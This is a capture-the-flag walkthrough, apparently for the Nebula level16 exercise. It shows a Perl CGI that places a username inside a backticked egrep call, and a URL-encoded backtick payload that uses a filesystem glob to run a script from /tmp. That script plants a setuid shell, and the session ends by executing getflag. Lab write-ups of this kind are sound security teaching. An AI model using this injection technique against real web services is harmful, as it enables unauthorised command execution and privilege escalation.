**Intro**

This level takes another look at abusing user supplied input to a script.

What immediately sticks out to me are the following lines of code

```
sub login {
$username = $_[0];
$password = $_[1];
$username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\s.*//; # strip everything after a space
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`
```

The code takes the username and password from the URL in the format "myuser:mypass: and converts the username to uppercase. It then attempts to egrep the userdb.txt file to find the username.  It then checks to see if the password matches.

In this instance, the userdb.txt file is blank which doesn't really matter.

There are a couple of ways to exploit this level.  

One way that requires a little extra work is to pass a variable inline and use the *tr* command to change the case.

The easier way is to take advantage of a concept known as [file globbing](http://www.tldp.org/LDP/abs/html/globbingref.html).

In this level what I've decided to do is create a file called [MAKESHELL](../resources/MAKESHELL) which will be called by the CGI.  The catch is that all the directories on the system are lowercase and the script will uppercase the path.  This is where the file glob comes into to play.

By injecting the glob **/*/MAKESHELL** the command will be searched for in every path location under root, including /tmp, where the file will reside.  The code should be executed and the shell binary created for me.

To test I URLENCODE the command

```
`/*/MAKESHELL`

URLENCODED: %60%2F*%2FMAKESHELL%60
```


**Contents of /home/flag16 - pre-exploit**

```
﻿level16@nebula:/home/flag16$ ls -l
total 5
-rwxr-xr-x 1 root root  730 2011-11-20 21:46 index.cgi
-rw-r--r-- 1 root root 3719 2011-11-20 21:46 thttpd.conf
-rw-r--r-- 1 root root    0 2011-11-20 21:46 userdb.txt
```


**Call the vulnerable service**

```
﻿level16@nebula:/home/flag16$ wget  'http://localhost:1616/index.cgi?username=%60%2F*%2FMAKESHELL%60'     <<< URL + encoded command that escapes the call to egrep
﻿Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:1616... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
index.cgi?username=`%2F*%2FMAKESHELL`: Permission denied

Cannot write to `index.cgi?username=`%2F*%2FMAKESHELL`' (Permission denied).
```

**Relist ~/flag16/**

```
﻿level16@nebula:/home/flag16$ ls -l
total 13
-rwxr-xr-x 1 root   root    730 2011-11-20 21:46 index.cgi
-rwsrwxrwx 1 flag16 flag16 7317 2016-10-25 02:31 shell
-rw-r--r-- 1 root   root   3719 2011-11-20 21:46 thttpd.conf
-rw-r--r-- 1 root   root      0 2011-11-20 21:46 userdb.txt
```


**Exploit and capture**

```
﻿level16@nebula:/home/flag16$ grep flag16 /etc/passwd
flag16:x:983:983::/home/flag16:/bin/sh
level16@nebula:/home/flag16$ ./shell 983
flag16@nebula:/home/flag16$ getflag
You have successfully executed getflag on a target account
flag16@nebula:/home/flag16$ 
```
